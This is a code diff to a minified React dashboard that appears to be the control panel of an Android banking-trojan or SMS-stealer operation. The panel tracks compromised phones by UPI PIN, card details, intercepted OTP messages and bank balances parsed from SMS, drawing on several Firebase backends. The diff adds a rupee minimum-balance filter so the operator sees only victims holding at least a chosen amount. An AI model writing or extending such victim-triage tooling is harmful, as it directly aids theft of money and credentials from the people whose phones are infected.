@@ -22029,7 +22029,7 @@ function p1({
 }) {
     const [firebaseSources, setFirebaseSources] = jt.useState(() => (multiConnections?.length ? multiConnections : [{ url: A, key: tt }]).filter(source => source && typeof source.url === "string" && source.url.trim())), isMultiFirebase = firebaseSources.length > 1, sourcesRef = jt.useRef(firebaseSources);
     sourcesRef.current = firebaseSources;
-    const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("online"), [v, E] = jt.useState("balance"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), [loadStatus, setLoadStatus] = jt.useState(""), [pageSize, setPageSize] = jt.useState(200), [balanceScope, setBalanceScope] = jt.useState("online"), [selectedBank, setSelectedBank] = jt.useState(""), [firebaseScope, setFirebaseScope] = jt.useState("online"), [selectedFirebase, setSelectedFirebase] = jt.useState(""), [selectedFirebaseBank, setSelectedFirebaseBank] = jt.useState(""), [quickAddOpen, setQuickAddOpen] = jt.useState(!1), [quickUrl, setQuickUrl] = jt.useState(""), [quickKey, setQuickKey] = jt.useState(""), [quickBusy, setQuickBusy] = jt.useState(!1), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), smsScanBusy = jt.useRef(!1), connectionRefreshBusy = jt.useRef(!1), smsScanTick = jt.useRef(0), smsLatestRef = jt.useRef(new Map), devicesRef = jt.useRef(d), xt = jt.useCallback(U => {
+    const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("online"), [v, E] = jt.useState("balance"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), [loadStatus, setLoadStatus] = jt.useState(""), [pageSize, setPageSize] = jt.useState(200), [balanceScope, setBalanceScope] = jt.useState("online"), [selectedBank, setSelectedBank] = jt.useState(""), [firebaseScope, setFirebaseScope] = jt.useState("online"), [selectedFirebase, setSelectedFirebase] = jt.useState(""), [selectedFirebaseBank, setSelectedFirebaseBank] = jt.useState(""), [quickAddOpen, setQuickAddOpen] = jt.useState(!1), [quickUrl, setQuickUrl] = jt.useState(""), [quickKey, setQuickKey] = jt.useState(""), [quickBusy, setQuickBusy] = jt.useState(!1), [minBalance, setMinBalance] = jt.useState(""), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), smsScanBusy = jt.useRef(!1), connectionRefreshBusy = jt.useRef(!1), smsScanTick = jt.useRef(0), smsLatestRef = jt.useRef(new Map), devicesRef = jt.useRef(d), xt = jt.useCallback(U => {
         k(U), setTimeout(() => k(""), 5000)
     }, []), D = jt.useCallback(async (U, J) => {
         try {
@@ -22169,6 +22169,12 @@ function p1({
         },
         _mtAll = jt.useMemo(() => d.filter(U => {
             if (w === "online" && !U.status || w === "offline" && U.status || w === "upi" && !U.upipin || w === "bank" && !U.smsAnalysis ?.bankBalances.length || w === "bank online" && (!U.status || !U.smsAnalysis ?.bankBalances.length) || w === "card" && !U.smsAnalysis ?.cards.length || w === "otp" && !(U.smsAnalysis?.otpMessages||[]).length) return !1;
+            // Minimum balance filter — applies to any view that includes a bank balance
+            const _minBal = parseFloat(minBalance);
+            if (!isNaN(_minBal) && _minBal > 0) {
+                const _devMaxBal = Math.max(0, ...(U.smsAnalysis?.bankBalances||[]).map(_b => parseFloat(String(_b.availableBalance||"0").replace(/[^0-9.-]/g,""))||0));
+                if (_devMaxBal < _minBal) return !1;
+            }
             const J = g.toLowerCase().trim();
             if (!J) return !0;
             if (U.name.toLowerCase().includes(J) || U.phoneNumber.includes(J) || U.id.toLowerCase().includes(J) || U.provider.toLowerCase().includes(J) || U.ip.includes(J) || U.android.toLowerCase().includes(J)) return !0;
@@ -22179,7 +22185,7 @@ function p1({
             const balanceOf = St => Math.max(0, ...(St.smsAnalysis?.bankBalances||[]).map(yt => Number(String(yt.availableBalance||0).replace(/[^0-9.-]/g,""))||0));
             const txnOf = St => Math.max(0, ...(St.smsAnalysis?.bankBalances||[]).map(yt => Number(String(yt.txnAmount||0).replace(/[^0-9.-]/g,""))||0));
             return v === "balance" ? balanceOf(J)-balanceOf(U) : v === "txn" ? txnOf(J)-txnOf(U) : v === "name" ? U.name.localeCompare(J.name) : v === "battery" ? J.batteryPercent - U.batteryPercent : v === "old" ? U.id.localeCompare(J.id) : J.id.localeCompare(U.id)
-        }), [d, w, g, v]),
+        }), [d, w, g, v, minBalance]),
         mt = jt.useMemo(() => _mtAll.slice(0, pageSize), [_mtAll, pageSize]),
         it = jt.useMemo(() => d.filter(U => U.status).length, [d]),
         bt = d.length - it,
@@ -22376,6 +22382,31 @@ function p1({
                             className: `px-3 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all ${w===U?U==="bank"||U==="bank online"||U==="balances"?"bg-emerald-600/20 text-emerald-400 border border-emerald-600/30":U==="otp"?"bg-amber-600/20 text-amber-400 border border-amber-600/30":U==="card"?"bg-purple-600/20 text-purple-400 border border-purple-600/30":"bg-red-600/20 text-red-400 border border-red-600/30":"text-[#555] hover:text-[#888]"}`,
                             children: U === "balances" ? "Balances" : U === "firebase" ? "Firebase Summary" : U === "bank online" ? "Bank Online" : U === "otp" ? "OTP" : U
                         }, U)), r.jsx("div", {
+                            className: "w-px h-4 bg-[#222]"
+                        }),
+                        // Minimum balance filter — type a number, see only devices with ≥ that balance
+                        r.jsxs("div", {
+                            className: `flex items-center gap-1 rounded-lg px-2 py-1 border ${minBalance && !isNaN(parseFloat(minBalance)) && parseFloat(minBalance)>0 ? "bg-emerald-600/15 border-emerald-600/40" : "bg-[#111] border-[#222]"}`,
+                            children: [r.jsx("span", {
+                                className: "text-[11px] text-emerald-500 font-bold",
+                                children: "₹≥"
+                            }), r.jsx("input", {
+                                type: "number",
+                                inputMode: "numeric",
+                                min: "0",
+                                value: minBalance,
+                                onChange: U => { setMinBalance(U.target.value); setPageSize(200); },
+                                placeholder: "Min bal",
+                                className: "bg-transparent text-xs text-white placeholder:text-[#555] w-20 outline-none",
+                                title: "Show only devices with available balance ≥ this amount"
+                            }), minBalance && r.jsx("button", {
+                                onClick: () => setMinBalance(""),
+                                className: "text-[11px] text-[#666] hover:text-red-400 px-1",
+                                title: "Clear",
+                                children: "×"
+                            })]
+                        }),
+                        r.jsx("div", {
                             className: "w-px h-4 bg-[#222]"
                         }), r.jsxs("select", {
                             value: v,
